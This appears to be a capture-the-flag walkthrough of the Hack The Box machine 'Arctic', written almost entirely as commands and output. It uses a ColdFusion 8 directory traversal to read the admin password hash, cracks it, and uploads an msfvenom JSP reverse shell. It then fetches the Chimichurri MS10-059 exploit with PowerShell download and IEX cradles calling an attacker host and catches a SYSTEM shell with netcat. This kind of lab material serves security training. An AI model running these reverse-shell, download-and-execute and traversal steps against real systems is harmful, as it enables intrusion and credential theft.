RECON
root@kali:~# nmap -sC -sV -p- -vv -oA full 10.10.10.11
Reason: 65532 no-responses
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack ttl 127
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

ENUM ADOBE COLDFUSION

http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 

OR RUN THIS DIRECTORY TRAVERSAL SCRIPT
https://www.exploit-db.com/exploits/14641
root@kali:~/htb/arctic# python 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/archives/index.cfm
title from server in /CFIDE/administrator/archives/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /cfide/install.cfm
title from server in /cfide/install.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------

javascript:alert(hex_hmac_sha1(document.loginform.salt.value, document.loginform.cfadminPassword.value))

1C2AD06CE4F78CEA5D4022D4D2EEC713579C22D9

EDIT POST
POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.11:8500/CFIDE/administrator/
Cookie: CFID=100; CFTOKEN=52208950
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 141

cfadminPassword=2B2BB77071CCD7E9F1FDE6CB9CD37FD9D3D729B5&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1604817396628&submit=Login

NEW POST
POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.11:8500/CFIDE/administrator/
Cookie: CFID=100; CFTOKEN=52208950
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 141

cfadminPassword=2B2BB77071CCD7E9F1FDE6CB9CD37FD9D3D729B5&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1604817396628&submit=Login

RESPONSE
HTTP/1.0 200 OK
Set-Cookie: CFAUTHORIZATION_cfadmin=;expires=Fri, 08-Nov-2019 06:38:25 GMT;path=/
Set-Cookie: CFAUTHORIZATION_cfadmin=;expires=Fri, 08-Nov-2019 06:38:25 GMT;path=/
Set-Cookie: CFAUTHORIZATION_cfadmin=;expires=Fri, 08-Nov-2019 06:38:25 GMT;path=/
Set-Cookie: CFAUTHORIZATION_cfadmin=;expires=Fri, 08-Nov-2019 06:38:25 GMT;path=/
Date: Sun, 08 Nov 2020 06:38:25 GMT
Cache-Control: no-cache
Content-Type: text/html; charset=UTF-8
Connection: close
Server: JRun Web Server

javascript:alert(hex_hmac_sha1(document.loginform.salt.value, '2B2BB77071CCD7E9F1FDE6CB9CD37FD9D3D729B5'));
hex_hmac_sha1(document.loginform.salt.value, '2B2BB77071CCD7E9F1FDE6CB9CD37FD9D3D729B5');

PASSWORD HASH ALREADY CRACKED ON CRACKSTATION
2B2BB77071CCD7E9F1FDE6CB9CD37FD9D3D729B5:happyday

OR CRACK WITH JOHN
./john arctic_hash

Proceeding with wordlist:./password.lst
happyday

CREATE REVERSE SHELL AS JSP FILE
root@kali:~/htb/arctic# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=53 -f raw > shell.jsp


UPLOAD FILE UNDER DEBUGGING AND LOGGING SECTION IN SCHEDULED TASKS **MAKE SURE TO SAVE FILE OUTPUT**
http://10.10.10.11:8500/CFIDE/administrator/index.cfm

root@kali:~/htb/arctic# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.11 - - [06/Nov/2020 20:56:22] "GET /shell.jsp HTTP/1.1" 200 -

CHECK PATH DIRECTORY FOR UPLOAD UNDER MAPPINGS IN SERVER SECTION OF PORTAL
Active ColdFusion Mappings
Logical Path 	Directory Path
/CFIDE  	C:\ColdFusion8\wwwroot\CFIDE 
/gateway  	C:\ColdFusion8\gateway\cfc  

TRIGGER REVERSE SHELL 
http://10.10.10.11:8500/CFIDE/shell.jsp

root@kali:~/htb/arctic# nc -lvp 53
listening on [any] 53 ...
10.10.10.11: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 50669
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

GET USER FLAG
C:\ColdFusion8\runtime\bin>type C:\Users\tolis\Desktop\user.txt
type C:\Users\tolis\Desktop\user.txt
#########################################

PRIVESC
root@kali:~# python /root/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /root/Windows-Exploit-Suggester/2020-11-04-mssb.xls --systeminfo /root/htb/arctic/systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

GET SYSTEMINFO
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          8/11/2020, 5:59:10 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 234 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.080 MB
Virtual Memory: In Use:    967 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11


CHECK FOR POTENTIAL EXPLOITS
root@kali:~# python /root/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /root/Windows-Exploit-Suggester/2020-11-04-mssb.xls --systeminfo /root/htb/arctic/systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done



USE CHIMICHURRI EXPLOIT ON ARCTIC
root@kali:~/htb/arctic# wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe

root@kali:~/htb/arctic# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.11 - - [06/Nov/2020 21:53:09] "GET /Chimichurri.exe HTTP/1.1" 200 


FETCH CHIMICHURRI ON ARCTIC
C:\Users\tolis\AppData\Local\Temp>echo $webclient = New-Object System.Net.WebClient > download.ps1
C:\Users\tolis\AppData\Local\Temp>echo $webclient.DownloadFile("http://10.10.14.8/Chimichurri.exe","Chimichurri.exe") >> download.ps1
C:\Users\tolis\AppData\Local\Temp>powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -File download.ps1
OR
IEX(New-Object Net.WbClient).downloadString('http://10.10.14.8/Chimichurri.exe)


C:\Users\tolis\AppData\Local\Temp>Chimichurri.exe
Chimichurri.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>



GET ROOT SHELL
C:\Users\tolis\AppData\Local\Temp>Chimichurri.exe 10.10.14.8 1234


root@kali:~/htb/arctic# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.11: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 50859
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\AppData\Local\Temp>whoami
whoami
nt authority\system


C:\Users\tolis\AppData\Local\Temp>dir C:\Users\Administrator\Desktop
dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\Administrator\Desktop

22/03/2017  09:02 ��    <DIR>          .
22/03/2017  09:02 ��    <DIR>          ..
22/03/2017  09:02 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  33.183.334.400 bytes free

GET ROOT FLAG
C:\Users\tolis\AppData\Local\Temp>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
########################################

